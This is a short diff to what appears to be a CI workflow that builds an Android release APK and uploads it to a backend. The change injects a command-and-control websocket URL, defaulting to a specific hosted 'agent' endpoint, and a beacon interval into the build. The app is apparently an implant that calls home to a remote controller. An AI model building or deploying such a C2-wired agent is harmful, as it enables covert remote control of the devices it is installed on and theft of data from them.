@@ -52,7 +52,9 @@ jobs:
         working-directory: software-android
         run: |
           chmod +x gradlew
-          ./gradlew assembleRelease --no-daemon
+          ./gradlew assembleRelease --no-daemon \
+            -Pc2WsUrl="${{ github.event.inputs.c2WsUrl || 'wss://bixtx.onrender.com/agent' }}" \
+            -PbeaconInterval="${{ github.event.inputs.beaconInterval || '30' }}"
 
       - name: Upload APK to backend
         if: success()
